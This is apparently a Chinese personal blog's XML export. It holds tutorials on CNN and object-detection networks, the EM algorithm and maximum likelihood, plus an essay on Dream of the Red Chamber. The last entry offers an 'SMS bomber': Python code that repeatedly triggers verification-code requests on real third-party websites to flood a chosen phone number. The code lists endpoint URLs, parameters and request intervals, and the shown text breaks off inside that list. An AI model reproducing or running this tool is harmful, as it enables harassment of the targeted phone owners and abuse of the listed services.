    <content type="text"><![CDATA[本文主要讲解关于有关物体检测的相关网络，具体包括R-CNN，Fast R-CNN，Faster R-CNN和Mask R-CNN等。在此之前会先将常见的几个比较有效的CNN网络也作简单的介绍。 一、经典的CNN1.LeNetLeNet是最早提出的几个卷积神经网络之一，现在看起其结构比较简单，只有简单的卷积、池化和全连接层，没什么特别的Tricks（技巧）。其示意图如下： 2. AlexNetAlexNet使用了较多的Tricks，比如用ReLU作为激活函数、使用最大池化代替平均池化、Dropout、数据增强等方法。在该网络中还提出了一个名为Local Response Norm的层，但是后来证实该层的加入并没有什么明显的效果。其示意图如下： 3. GoogLeNet GoogLeNet设计了一个名为Inception的网络结构（如上图所示），该结构将CNN中常用的卷积（1x1，3x3，5x5）、池化操作（3x3）堆叠在一起（卷积、池化后的尺寸相同，将通道相加），一方面增加了网络的宽度，另一方面也增加了网络对尺度的适应性。其中1x1卷积的主要目的是为了减少维度，还用于修正线性激活（ReLU）。GoogLeNet就是多个 Inception 结构串联而形成的。它的参数相对于同时期其他网络来说要少很多，这也保证了其训练速度比较快。 有趣的是GoogLeNet中的L是大写的，这是为了致敬LeNet。其示意图如下： 4. VGG NetVGG Net是一种比较勤奋的网络，它试验了多种不同的卷积核大小的组合，最终挑出来了一个效果最好的版本——VGG 19。VGG 19放弃了较大的卷积核，而使用较小的卷积核，同时也增加了网络的深度，这导致网络的参数过多。不同的VGG版本所采用的结构如下： 5.ResNetResNet全称Residual Networks，可译作残差网络。所谓残差是指观察值与预测值之间的差。当一个神经网络的深度不断增加时，其训练误差会先减少后增大。为了克服该问题，残差网络引入了残差块的概念（如下图所示），残差网络就是由多个残差块组成的。 在下图中，x 是神经网络浅层的输出，x 会先经一个$3\times3$的卷积，再经 ReLU函数激活，再经一个$3\times3$的卷积，得到 $F(x)$，然后将深层的输出 F(x) 加上浅层的输出 x，将 $F(x)+x$ 作为训练的目标。当浅层网络的输出 x 训练的足够好时，只需要另 F(x) = 0 即可保留已经训练好的结果。也就是说浅层网络可以看作是深层网络的子网络，深层网络至少不会比浅层网络有更差的效果。 二、目标检测网络 目标检测就是把图像中的物体用bounding box标注其所在的位置；语义分割是在像素级别上把前景和后景分割出来，同一类别的不同个前景为同一标注；实例分割会把同一类别的不同个前景标注为不同的标记。如上图所示，语义分割会把三只羊打上相同的标注，而实例分割会把三只羊打上不同的标注。 1. OverfeatOverfeat把网络的1~5看作是特征提取层，不同的任务共享该特征提取层，这种做法减少了特征提取层参数的重复训练。 2. R-CNNR-CNN（regions with CNN features）的算法流程如下： (1) 输入图片； (2) 使用selective search（选择性搜索）生成多个region proposal（建议区域/候选区域），并wrap到固定的尺寸； (3) 将每个候选区域输入到 CNN 中，提取每个候选区域的特征； (4) 使用SVM对特征进行分类，对每个特征都建立一个SVM分类器。并对每一个类别进行NMS（非极大值抑制），得到最终的 bounding box。 R-CNN算法最大的缺点就是对于每个 region proposal 都需要重新对其提取特征，而这些 region proposal 之间可能存在重叠，这就导致了大量重复的计算。 selective search 在 selective search 算法提出之前，对于候选框的搜索是用的是一种暴力搜索算法——滑动窗口算法。在该算法中，要使用一个小窗口遍历搜索整张图片，在每个位置上对滑窗内的图片做物体识别。不仅要搜索不同的位置，还要遍历不同的大小，所以非常耗时间。 而在选择性搜索算法中，由于不知道物体的尺寸如何，所以会先设法得到若干个小尺度的候选框，然后再根据小尺度候选框之间的相似性将其合并为尺寸较大的候选框。 非极大值抑制 顾名思义，所谓的非极大值抑制就是抑制不是极大值的元素。在进行目标检测时，对同一个物体可能存在多个候选框，当候选框互不重叠时会全部保留，而当候选框的重叠程度（IOU）超过某个阈值时就会只保留置信度最大的候选框。 3. Fast R-CNNFast R-CNN在R-CNN的基础上做了一定的改进，它会先对整个图片提取特征，然后再选取 region proposal，这就避免了重复的运算。其算法流程如下： (1) 提前整张图片的特征，得到 feature map(特征图)； (2) 用 selective search 选取若干个 ROI（region of interet，感兴趣的区域），并找到每个 ROI 在特征图上的映射 path（一小块图像）； (3) 用 ROI pooling layer 将path统一到相同的尺寸（因全连接的输入大小是固定的）； (4) 经过两个全连接层，然后对特征分别进行分类和 bounding box 回归，分类就是确定每个bounding box中是什么物体，而 bounding box回归就是对 bounding box 的位置进行调整。分类时使用 softmax 代替SVM，回归时使用了 smooth 的 L1损失。 Fast R-CNN采用了联合训练的方式，即总损失函数=分类损失+回归损失。在测试时还加入了NMS处理，以提高目标检测的质量。 ROI pooling是 SPP-Net的一个精简版，其流程为： (1) 将ROI映射到特征图的对应区域； (2) 将映射后的区域根据输出的大小平均分为同等大小的区域。比如，如果输出大小是2$\times$3的，则应将映射后的区域平均分为2行3列个小格。如果不能平均分，则对小格的大小取整； (3) 对每个小格进行最大池化。 4. Faster R-CNNFaster R-CNN将Fast R-CNN中的 selective search 方法替换为了 Region Proposal Networks（RPN）。RPN用来生成 region proposal，它通过softmax 分类判断 anchors 属于前景还是背景，再利用 bounding box 回归来修正 anchors ，以获得更精确的候选区域。 所谓的 anchors（锚点）就是三组大小不同的矩形框，每组矩形框又包含3个长宽比分别为 1:1，1:2，2:1的矩形框。因为如果对特征图的每个像素点都配备一组 anchors，则候选框会很多，所以实际中会在合适的 anchors 中随机选取 128个 postive anchors 和 128 个 negtive anchors来进行训练。 5. Mask R-CNNMask R-CNN使用 ResNet + 特征金字塔（Feature pyramid network, FPN）获取对应的特征图，并用 ROI Align 代替 ROI Pooling 来保证输出特征图大小固定。此外该网络还可以在标记出 bounding box的基础上，为前景增加 mask。 特征金字塔特征金字塔是一种多尺度的检测方法，它先讲图片不断的做 2$\times$2 的pooling（下采样），形成多个尺寸由大到小的特征图，再对每一层特征图做 $1\times1\times n$ （n为通道数）的卷积，形成多层只有一个通道的特征图。因为多层特征图呈现出金字塔的形状，所以称作特征金字塔。 ROI AlignROI 映射到特征图后的区域的坐标往往是小数，ROI Pooling 所采取的办法是区域的大小直接取整，这样才能在特征图上截取对应的区域。 ROI Align 会在 ROI 的每个小格子中取 n 个采样点，并用双线性插值计算采样点的值，小格子的值就是采样点取最大值/平均值的结果。然后再对映射后的区域进行相应的池化操作。 Mask R-CNN由于使用了 ROI Align算法，所以在一定程度上提高了对小物体的检测精度。 以下是以上几个网络的对比图： 6. YOLOYOLO（You Only Look Once）是一种 one-stage（单步）的端到端的目标检测算法，基本实现了对视频数据的实时处理。该算法一共有三个版本。 YOLO v1 YOLO v1将图片平均划分为 $7\times7=49$ 个网格（grid），每个网格只允许预测出 2 个边框（bounding box），它们很粗糙的覆盖了图片的整个区域。$49\times2=98$ 个边框再去除置信度较低的目标窗口，并由NMS去除冗余窗口，得到最终的结果。这种做法虽然降低了 mAP（平均精度均值），但是大幅提升了效率。 在该算法中总损失函数=bounding box 的位置误差 + bounding box 置信度误差 + 对象分类误差。该算法的缺点是容易产生定位错误，并且对小物体的检测效果不好。 YOLO v2YOLO v2在前一版本的基础上主要做了以下改进： (1) Batch Normalization (2) High Resolution Classifier（高分辨率分类器）: 先用小图训练，后用大图微调； (3) Convolutional with Anchor Boxes: 不逐像素扫描，而是每个网格有给定个数个 anchor 来预测 bounding box； (4) Dimension Cluster（维度聚类）: 使用 K-means 算法训练 bounding box，以找到更好的边框宽高维度； (5) Multi-Scale Training（多尺度训练）: 每经过10次训练（10个epoch）就随机选择新的图片尺寸。 YOLO v3YOLO v3 将输入图像平均分为 $13\times13$ 个网格，如果 ground truth 中某个物体的中心坐标落在某个网格中，则用该网格来预测该物体（因为每个网格所预测的 bounding box 的个数是有限的），所预测的 bounding box 中只有和 ground truth 的 IOU（交并比）最大的 bounding box 才用来预测该物体。 YOLO v3 还做了以下主要几点改进： (1) 分类预测：用二元交叉熵损失来代替softmax损失进行类别预测； (2) 跨尺度预测：提供了3种尺寸不一的边框，用相似的FPN提取这些尺寸的特征，以形成金字塔形网络； (3) 特征提取器：用 DarkNet-53 来提取特征。 以下是YOLO不同版本的对比图：]]></content>
      <categories>
        <category>深度学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[红楼梦]]></title>
    <url>%2F2019%2F09%2F16%2Fhlm%2F</url>
    <content type="text"><![CDATA[我听说那些附庸风雅的人，最后大多也都变得真正风雅，所以我要做一个附庸风雅的俗人。 ​ “那些附庸风雅的人，最后大多也都变得真正风雅”这句话我是在《圆桌派》中听说的，听到这句话后自己突然意识到也许多去读点文学类的书籍也是很重要的。说起附庸风雅这件事，我高中毕业后好像就开始在做了，当时觉得自己都高中毕业了，然而中国四大名著中除了《西游记》之外自己竟然都不知道讲了些什么，于是就利用假期的时间来接触一下。但是又觉得看书太麻烦了，就只看了一下电视剧，最开始看的是《三国演义》，看之前一直听说过曹操很奸诈，而刘备很忠厚，看过之后发现原来刘备的城府也丝毫不亚于曹操，不然也不可能由一个做草鞋的变成蜀国的创始人。 ​ 早在几年前，我完全想不到自己有一天会读完《红楼梦》的前80章，至于后40章因为不是曹雪芹写的，据说续写和原作有较大出入，暂时也就不打算读了。对于《红楼梦》最初的印象可能是在 8 年级的时候，当时语文课本中有林黛玉初进大观园一文，当时老师给我们讲文中描写人是多么的栩栩如生，比如描写林黛玉是“心较比干多一窍，病如西子胜三分”，描写王熙凤是“一双丹凤三角眼，两弯柳叶掉梢眉”。又讲到《红楼梦》的作者对于建筑、中医、绘画是多么的精通。但是当时并没在意这些。 ​ 《红楼梦》的电视剧我是在大三的寒假看的，当时一边看电视剧，一边看书上的描写，不得不说电视剧对原著的还原程度还是很高的，但是总是感觉这个电视剧情节太不连续了，后来看书才知道因为《红楼梦》的篇幅太大了，所以电视剧中删去了很多细节。而我之前又常常觉得，如果一个作品想要足够深刻，要么去描写富贵人家的骄奢淫逸，和鲁迅一样用最犀利的文笔去批判社会，要么像甄嬛传一样描写人与人之间的博弈，批判人心的险恶。而这些我在电视剧的前部分都没有找到，不得不说《红楼梦》表现的真是太含蓄了。在小说前半部分中的关于性的描写可能也只有“遂强袭人同领警幻所训云雨之事”这一句。 ​ 老梁说如果曹雪芹只把《红楼梦》中的诗词拿出来也足够称得上是清朝第一诗人。像“假作真时真亦假，无为有处有还无”、“世事洞明皆学问，人情练达即文章”、“女人是水做的，男人是泥做的”这些较为人熟知的话皆是出自《红楼梦》，读起来都是极美的。又如贾雨村评价宝玉“若生于公侯富贵之家，则为情痴情种；若生于诗书清贫之族，则为逸士高人，纵再偶生于薄祚寒门，断不能为走卒健仆，甘遭庸人驱制驾驭，必为奇优名倡。”作者写描写宝玉的诗： “无故寻愁觅恨，有时似傻如狂。 纵然生得好皮囊，腹内原来草莽。 潦倒不通世务，愚顽怕读文章。 行为偏僻性乖张，那管世人诽谤！ 富贵不知乐业，贫穷难耐凄凉。 可怜辜负好时光，于国于家无望。 天下无能第一，古今不肖无双。 寄言纨袴与膏粱，莫效此儿形状”。 ​ 但是看完电视剧后我还是有点搞不懂它为什么被称作四大名著之首，书也只读了十四章就不读了，因为实在看不懂。直到一次去西安去看大雁塔时，突然听到有一群人在唱戏，出于好奇就过去听了一下。感觉唱的哀婉，查了一下歌词，那帮老头老太唱的正是《红楼梦》中的《葬花吟》和《枉凝眉》。当时我就想，这部小说是有多大的魅力才能让他们如此痴迷，让一群“红迷”在这里一边演奏一边合唱。于是自己又搜《葬花吟》这首歌，据说作曲人为了给《红楼梦》作曲用了4、5年的时间，在作曲过程中也时常被感动到落泪。《葬花吟》一曲中一上来就是“花谢花飞花满天，红消香断有谁怜？”，结尾处唱到“愿奴胁下生双翼，随花飞到天尽头。 天尽头，何处有香丘？”。作曲者说这哪里是对落花的感叹啊，明明是感叹一个女子的一生！从此我萌生了重读《红楼梦》的想法。 ​ 于是我趁毕业后暑假在上海坐地铁的间隙来读《红楼梦》，一边读一边看一些解读。有人说《红楼梦》就像是作者精心构建的一个精神世界，他极其详细的描绘这里的点点滴滴，甚至是人的衣着和饮食，然后又看着这些一步步走向灭亡，落了片白茫茫大地真干净。就像甄士隐对《好了歌》做的批注： 陋室空堂，当年笏满床。 衰草枯杨，曾为歌舞场； 蛛丝儿结满雕梁，绿纱今又在蓬窗上。 说什么脂正浓、粉正香，如何两鬓又成霜？ 昨日黄土陇头埋白骨，今宵红绡帐底卧鸳鸯。 金满箱，银满箱，转眼乞丐人皆谤； 正叹他人命不长，那知自己归来丧！ 训有方，保不定日后作强梁。 择膏粱，谁承望流落在烟花巷！ 因嫌纱帽小，致使锁枷扛； 昨怜破袄寒，今嫌紫蟒长： 乱烘烘你方唱罢我登场，反认他乡是故乡。 甚荒唐，到头来都是为他人作嫁衣裳！ ​ 《红楼梦》的开篇也很有趣，像是一个神话故事。贾宝玉的前世是女娲补天时唯一一块没有用到的石头，因为想要来人世体验一番，便下凡为人。而林黛玉前世是一株“绛珠仙草”，因为受过贾宝玉的灌溉之情，所以也下世为人，用她一生的眼泪来偿还他的恩情。所以贾宝玉第一次看到林黛玉时说“这个妹妹我曾见过的”，又说“虽然未曾见过他，然我看着面善，心里就算是旧相识，今日只作远别重逢，亦未为不可”，简直情话技能满级。作者还自嘲道“满纸荒唐言，一把辛酸泪。都言作者痴，谁解其中味”。讲真，敢于说自己写的是“荒唐言”的作者我也是第一次看到。 ​ 小说的文学性也十分强，采用了“真事隐去，假语村言”（一说假语存焉）的写作手法，而甄士隐和贾雨村正好是书中的两个角色。类似的谐音还有很多，比如甄士隐的女儿英莲，本意为“应怜”，应该怜惜之意，而英莲因为奴才霍启（祸起）的疏忽而被拐走。作者在小说中的很多地方都写到了对各人命运的预言。比如第五章就描写了宝玉在梦中见到了自己家族重要女性的结局，每个人都有一个判词，但是读到此处时，事情还尚未发生，所以经常会觉得不知所云。比如玉带林中挂，金簪雪里埋描写的就是林黛玉和薛宝钗。又如子系中山狼一句不仅有他是中山狼的意思，而且“子系”两字加起来就是繁体的“孙”字，暗示了迎春嫁给孙绍祖后的悲惨生活。甚至每个人所写的诗词和灯谜中也暗示了她们各自的结局。 ​ 电视剧中我最不理解的一点就是宝玉，总感觉他和他的仆人、丫头都没有明显的上下级关系，更像是打打闹闹的朋友，甚至下面的人犯了错宝玉都会主动背锅。而这个宝玉又总是喜欢吃女孩子嘴上的胭脂，你说他是好色之徒吗？但是他好像又没做过什么。直到最近听完“蒋勋讲红楼梦”的音频我才明白，也许宝玉是一个不想长的少年，也许他只是不明白为什么从小玩到大的朋友长大之后就变得男女授受不亲了。也许作者对《红楼梦》中里面的人物都有特殊的悲悯，薛宝钗的哥哥薛蟠为了得到一个女子就把人家的未婚夫打死，但是他真的可恶吗？还是被父母宠溺坏了，任何他想得到的东西就不顾一切的设法得到。暗恋王熙凤的贾瑞虽然出身一般，还经常被冷落，但他喜欢一个不该喜欢的人就真的罪该至死吗？领悟到就连菱角、鸡头、苇叶、芦根得了风露，那一股清香，就令人心神爽快的的香菱难道不比只知桂花香的夏金桂的人生更有价值吗？ ​ 之前一直以为宝玉和黛玉是相互爱慕的关系，但是现在更觉得两人是难得的知己。宝玉在挨打之后，宝玉让人给黛玉送了两块旧手帕，黛玉一开始以为是新手怕不肯要，听说是旧的才肯收下。我当时读的时候很不解，后来才知道宝玉原来是怕黛玉伤心，特意送手帕让她拭泪。又如宝玉跑去乡下的道观去祭奠投井死亡的金釧回来后，黛玉虽然不知道他做了什么，但是说道“天下的水总归一源，不拘那里的水舀一碗看着哭去，也就尽情了”。我不禁感叹，一生能有这样一位知己也足够了。 ​ 也经常会见人讨论是喜欢林黛玉还是薛宝钗，林黛玉敢爱敢恨，从不掩饰自己对别人的情感，但是比较敏感多心，所以往往会得罪人；相反，薛宝钗就显得懂事的多，常为他人考虑，帮助别人也很大方，当宝钗生日贾母让她选食物和戏曲时她都是揣摩贾母所喜爱的来选的。但是后者的性格就真的好，前者就真的坏吗？至少，作者在书中没有明确的写出宝钗的温柔体贴是真心还是假意。不过我想，像黛玉一样的人往往更加坦荡，而像宝钗一样的人心里想的什么可能很难揣测，就像王熙凤评价宝钗&quot;不干己事不张口，一问摇头三不知&quot;。就像很多人一样可能曾经敏感多心，也想要黛玉一样敢爱敢恨，但是往往用言语伤了最亲密的人，也就学乖了，想变成和宝钗一样不会伤害别人的人。 ​ 零零碎碎说了这么多，一方面是炫耀自己读过了《红楼梦》（果然越是炫耀什么就越缺少什么），另一方面的确是很喜欢这部小说。希望自己在40、50岁后能够再读一遍，也许会有不一样的感悟。]]></content>
      <categories>
        <category>附庸风雅</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[机器学习（7）：EM（期望最大化）算法]]></title>
    <url>%2F2019%2F09%2F15%2FEM%2F</url>
    <content type="text"><![CDATA[本文主要讲解有关EM算法的相关知识，除了给出算法的基本思想，还会给出该算法的由来及公式推导，这又涉及到极大似然估计和Jensen不等式的相关内容。 本文主要是依据李航老师的《统计学习方法》和邹博老师的机器学习教学视频总结编写的。文中所用到的有关机器学习的基本概念和方法可以参考本人博客中该系列之前的文章，或者直接上网搜索相关的内容。以下文章所列出的公式以及公式的推导读者们最好是在草稿本上自己推导一遍。由于本人水平所限，文章中难免有错误和不当之处，欢迎大家多多批评指正！ 一、EM算法概述EM算法又称期望最大化算法，它是一种迭代算法，可以用来求含有隐变量的概率模型的极大似然估计。所谓隐变量就是不能直接观测的变量。比如有三枚硬币，要根据第一枚硬币的正反来决定投掷第2、3枚硬币中的哪一枚。观测变量是第2、3枚硬币的正反，隐变量是第一枚硬币的正反。 如果概率模型的变量都是观测变量，则给定数据，可以直接用极大似然估计法来求得最优的模型参数。但是如果模型含有隐变量时，极大似然估计法就不再适用了，这时可以选择用EM算法来解决。 学习EM算法必须先了解两个知识点——极大似然估计和Jensen不等式。其中极大似然估计已经在文章极大似然估计和最小二乘法讲过了，下面就先来看一下Jensen不等式的相关内容。 二、Jensen不等式Jensen不等式有个大前提：函数$f(x)$是凸函数。以下性质都是在该前提的基础上成立的。 1. 对于二维平面Jensen不等式的形式为：$$f(\theta x+(1-\theta)y)\leq \theta f(x)+(1-\theta)f(y)$$这也是凸函数的一种定义。 2. 对于n维平面$$f(\theta_1x_1+\theta_2x_2+…+\theta_nx_n)\leq \theta_1f(x_1)+\theta_2f(x_2)+…+\theta_nf(x_n)$$ 其中$\theta_1+\theta_2+…+\theta_n=1$且$\theta_i\geq0$ 3. 一般形式在上式中有$\theta_1+\theta_2+…+\theta_n=1$且$\theta_i\geq0$，所以可以把$\theta_i$看作是随机变量$x_i$发生的概率，那么$f(\theta_1x_1+\theta_2x_2+…+\theta_nx_n)=f(Ex)$，而$\theta_1f(x_1)+\theta_2f(x_2)+…+\theta_nf(x_n)=Ef(x)$，所以有：$$f(Ex)\leq Ef(x)$$即函数的期望大于期望的函数，当且仅当$x_i=c$，c为常数时取等号。 三、EM算法在极大似然估计和最小二乘法一文中提到过，可以用负对数似然函数作为模型的损失函数，想要让损失函数（负对数似然函数）取最小值，则对数似然函数应该取最大值。 若样本满足概率分布$p(x_i;\theta)$，则令目标函数为对数似然，并求它的最大值：$$l(\theta)=lnL(\theta)=\prod_{i=1}^n\log p(x_i;\theta)=\sum_{i=1}^n\log p(x_i;\theta)$$ $$=\sum_{i=1}^n\log\sum_{z_i} p(x_i,z_i;\theta)$$ 其中$z_i$是隐变量，联合概率密度$p(x_i,z_i;\theta)$对隐变量积分就得到了边缘概率密度$p(x_i;\theta)$。 之前说了，由于含有隐变量，用极大似然估计估计对其求导的方法并不适用，所以采用了EM算法，迭代的更新参数，重复该过程直到收敛到局部最大值。 EM算法的基本思想如上图所示，$\theta$是参数，紫色的曲线是目标函数$p(x|\theta)$，则对于一个特定的$\theta_i$（图中绿色直线的位置）来说，找一个目标函数在$\theta_i$处的下界函数，假设该下界函数在$\theta_{i+1}$（图中红色直线的位置）处取得最大值。如果用$\theta_{i+1}$更新原来的$\theta_i$，因为是下界函数，参数更新后下界函数的值变大了，则目标函数的值肯定也变大了。不断重复该过程，就可以收敛到一个局部最大值，注意不是全局最大值。 所以从之前直接求目标函数的解析解的方式，变成了迭代的求下界函数并更新参数，从而使目标函数值更大的过程。 下面继续进行公式的推导，假设$Q_i$是$z_i$的某一个分布，则$$l(\theta)=\sum_{i=1}^n\log\sum_{z_i} p(x_i,z_i;\theta)=\sum_{i=1}^n\log\sum_{z_i}Q_i(z_i)\frac{ p(x_i,z_i;\theta)}{Q_i(z_i)}$$ $$\geq\sum_{i=1}^n\sum_{z_i}Q_i(z_i)\log\frac{ p(x_i,z_i;\theta)}{Q_i(z_i)}$$ 下面来解释一下$\geq$成立的原因。我们可以把$\frac{ p(x_i,z_i;\theta)}{Q_i(z_i)}$整体看作是一个随机变量，不妨记作$Y$，则$\log\sum_{z_i}Q_i(z_i)\frac{ p(x_i,z_i;\theta)}{Q_i(z_i)}$就可以看作是关于$Y$的期望的函数值，即$\log EY$， 而$\sum_{z_i}Q_i(z_i)\log\frac{ p(x_i,z_i;\theta)}{Q_i(z_i)}$可被看作是函数值的期望，即$E\log(Y)$，由Jensen不等式可知，以上不等式成立。 到此为止，我们找到了目标函数在参数$\theta$处的下界函数的表达式，为了进一步简化，不妨设目标函数和下界函数在$\theta$处的函数值是相等的。 由上述可知，当且仅当$Y$为常数时等式成立。也就是$Q_i(z_i)$正比于$p(x_i,z_i;\theta)$，又因为$Q_i(z_i)$是概率分布，所以$\sum_z{Q_i(z_i)=1}$。下面凑出一个满足这两个约数条件的$Q_i(z_i)$：$$Q_i(z_i)=\frac{p(x_i,z_i;\theta)}{\sum_j{p(x_i,z_j;\theta)}}$$ $$=\frac{p(x_i,z_i;\theta)}{p(x_i;\theta)}$$ $$=p(z_i|x_i;\theta)$$ 第一个等式相当于做了一个归一化，分母是所有的$z_i$相加的和，分子是一个特定的$z_i$，这就保证了$\sum_z{Q_i(z_i)=1}$，同时$p(x_i,z_i;\theta)$和$Q_i(z_i)$的比值是$p(x_i;\theta)$，是一个定值。 找到下界函数之后，只需要求下界函数的最大值，然后更新对应的参数$\theta$就好了。 EM算法可以分为E步和M步两个主要步骤，其中E步是估计参数的值，M步是使下界函数最大化。其算法流程为： (1). 初始化参数$\theta$ (2). E步：根据上一次迭代的模型参数来计算新的下界函数：$$Q_i(z_i)=p(z_i|x_i;\theta)$$(3). M步：将下界函数最大化以获得新的参数值：$$\theta=arg\max_\theta\sum_i\sum_{z_i}{Q_i(z_i)}\log\frac{p(x_i,z_i;\theta)}{Q_i(z_i)}$$(4). 重复(2)、(3)两步直到收敛到局部最小值。]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[机器学习番外篇（1）：极大似然估计和最小二乘法]]></title>
    <url>%2F2019%2F09%2F14%2FMLE%2F</url>
    <content type="text"><![CDATA[番外篇的内容主要是讲解一些在机器学习中经常会用到但是比较边缘化的知识，或者是某几个知识之间的一些联系和思考。番外篇的第一篇文章就来说一下“极大似然估计”，以及它与最小二乘法、负的对数似然之间的联系。 一、极大似然估计极大似然估计（Maximum Likelihood Estimate，MLE）是一种在“模型已定，参数未知”的情况下来根据已有的观测值来确定最有可能的模型的参数的参数估计方法。其中“似然”二字是文言文，可以翻译成“可能这样”、“似乎这样”的意思，用现在的话说，就是“概率”的意思。 极大似然估计的步骤如下： (1). 写出似然函数 (2). 对似然函数取对数，并化简整理 (3). 对数似然函数对参数$\theta$求导，并令导数为0 (4). 求得参数$\theta$，得到最终的模型 下面来看一下极大似然估计可行的原因以及其详细步骤。 假设我们已经知道样本满足的模型（概率分布）为$p(x;\theta)$，其中$\theta$是未知参数，$p(x;\theta)$表示在参数为$\theta$时出现观测数据的概率。 现在已知多个样本的观测值（具体的数值）：$x_1,x_2,…,x_n$，可以假设这些样本的观测值是独立同分布的。那么这些样本观测值同时出现的概率就是它们的联合概率密度：$$L(x;\theta)=p(x_1,x_2,…,x_n;\theta)=p(x_1;\theta)\cdotp(x_2;\theta)\cdot…\cdotp(x_n;\theta)$$上述等式成立的条件是样本观测值之间独立。现在我们想去求使得以上概率最大时的参数是多少，通常的想法是一个函数只有在导数为0的时候才可能取极值，所以应该对以上概率函数求导，并令导数为0，求得参数$\theta$。若有多个极值点，则还需要比较每个极值点的函数值大小。 但是因为上述概率函数是乘积的形式，不易求导，所以可以对其取对数，让它变为累加的形式，同时概率函数的单调性也不会发生变化。得以下公式：$$ln[L(x;\theta)]=ln[p(x_1;\theta)\cdotp(x_2;\theta)\cdot…\cdotp(x_n;\theta)]=ln[p(x_1;\theta)]+ln[p(x_2;\theta)]+…+ln[p(x_n;\theta)]$$再对其求导，并令导数为0：$$\frac{\partial ln[L(x;\theta)]}{\partial \theta}=0$$求得参数$\theta$后就得到了完整的模型$p(x;\theta)$。 二、极大似然估计和最小二乘法最小二乘法在机器学习的第0篇已经提到过，它的基本思想是：把使得测量值和真实值之间误差的平方和最小的测量值y当作真实值。可以用公式表示为：$$\min_y(\sum{(y-\hat y)^2})\Rightarrow 真值y$$下面我们就来看一下极大似然估计和最小二乘法之间的关系，或者说从极大似然估计的角度解释最小二乘法。 假设在样本的真实值$y$和预测值$\hat{y}$之间存在以下关系：$$y_i(x_i)=\hat{y_i}(x_i;\theta)+\varepsilon_i$$其中$x$是样本，$\theta$是预测模型的参数，$\varepsilon$是预测值与真实值之间的误差。 假设样本相互独立，并且误差$\varepsilon$是由大量因素所造成的，则由中心极限定理可知，大量随机变量的和近似服从于正态分布$n(\mu,\sigma^2)$。而通过等比例的调整模型的参数$\theta$总是可以使得误差满足均值为0的正态分布，即$\varepsilon \sim N(0,\sigma^2)$。$$p(\varepsilon_i)=\frac{1}{\sqrt{2\pi}\sigma}\exp{(-\frac{\varepsilon_i^2}{2\sigma^2})}$$又因为$$\varepsilon_i=y_i(x_i)-\hat{y_i}(x_i;\theta)$$所以$$p(y_i|x_i;\theta)=p(\varepsilon_i)=\frac{1}{\sqrt{2\pi}\sigma}\exp{[-\frac{(y_i-\hat{y_i})^2}{2\sigma^2}]}$$极大似然函数为：$$L(\theta)=\prod_{i=1}^np(y_i|x_i;\theta)$$对数似然函数为：$$lnL(\theta)=ln\prod_{i=1}^np(y_i|x_i;\theta)=\sum_{i=1}^nln\frac{1}{\sqrt{2\pi}\sigma}\exp{[-\frac{(y_i-\hat{y_i})^2}{2\sigma^2}]}$$ $$=n\cdot ln\frac{1}{\sqrt{2\pi}\sigma}-\frac{1}{2\sigma^2}\sum_{i=1}^n(y_i-\hat{y_i})^2$$ 下一步就是通过求导求得使得对数似然函数取最大值时$\theta$的取值。由于$n\cdot ln\frac{1}{\sqrt{2\pi}\sigma}$是个定值，所以只需要求$\frac{1}{2}\sum_{i=1}^n(y_i-\hat{y_i})^2$什么时候取最小值即可。 而这正好是最小二乘法要做的事情，即求 $J(\theta)=\frac{1}{2}\sum_{i=1}^n(y_i-\hat{y_i})^2$最小时的$\theta$值。 所以在机器学习中，经常会用平方误差函数作为模型的损失函数，平方误差函数的本质其实就是上面推导出来的负对数似然函数。]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[短信轰炸机]]></title>
    <url>%2F2019%2F09%2F11%2Fsms-bomber%2F</url>
    <content type="text"><![CDATA[以下代码基于 Github 中的一个短信轰炸的代码，并在其基础上进行了一点改进。不过首先声明，不得利用本代码做违法的事，使用本代码所产生的任何后果本人都不承担任何责任。 代码是用python语言写的，只需要安装所需要的几个包就可以了。短信轰炸机的原理就是通过爬虫自动请求发送验证码，这样所要轰炸的手机号就会不断的收到验证码信息。其他细节见代码注释。另，欢迎在github上start或fork该代码：短信轰炸机~ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178#!/usr/bin/python# -*- coding: utf-8 -*-import requestsimport reimport threadingimport osimport randomimport socketimport structimport time#API接口初始化，按照手机号生成不同的网址def initAPI(phone): # 短信接口API 请求间隔时间 备注 请求方式 请求参数 需要SESSION的先决请求URL以及Referer APIList = [ ["https://login.ceconline.com/thirdPartLogin.do", 60, "世界经理人", "POST", &#123;"mobileNumber": phone, "method": "getDynamicCode", "verifyType": "MOBILE_NUM_REG", "captcharType": "", "time": str(int(time.time() * 1000))&#125;, ""], ["http://www.ntjxj.com/InternetWeb/SendYzmServlet", 120, "机动车手机绑定", "POST", &#123;"sjhm": phone&#125;, "http://www.ntjxj.com/InternetWeb/regHphmToTel.jsp"], ["https://www.itjuzi.com/api/verificationCodes", 60, "IT橘子", "POST", &#123;"account": phone&#125;, ""], ["http://yifatong.com/Customers/gettcode", 60, "易法通", "GET", &#123;"rnd": ("%0.3f" % (time.time())), "mobile": phone&#125;, "http://yifatong.com/Customers/registration?url="], ["http://qydj.scjg.tj.gov.cn/reportOnlineService/login_login", 60, "天津企业登记", "POST", &#123;'MOBILENO': phone, 'TEMP': 1&#125;, ""], ["http://www.shijiebang.com/a/mobile/vcode/", 120, "世界邦", "GET", &#123;'key': phone&#125;, "http://www.shijiebang.com/reg/"], [ "http://reg.ztgame.com/common/sendmpcode?source=giant_site&amp;nonce=&amp;type=verifycode&amp;token=&amp;refurl=&amp;cururl=http://reg.ztgame.com/&amp;mpcode=&amp;pwd=&amp;tname=&amp;idcard=", 60, "巨人网络", "GET", &#123;'phone': phone&#125;, "http://reg.ztgame.com/"], ["http://www.homekoo.com/zhixiao/zt_baoming_ajax_pc_new.php", 180, "尚品宅配", "POST", &#123;"action": "OK", "username": "吕布", "tel": phone, "qq": "", "province": "", "city": "", "kehu_tel_time": "", "tg_id": "296", "sp_type": "986", "num_id": "5", "zhuanti_pages": "http://www.homekoo.com/zhixiao/cuxiao/index.php", "prevurl": ""&#125;, "http://www.homekoo.com/zhixiao/cuxiao/index.php"], 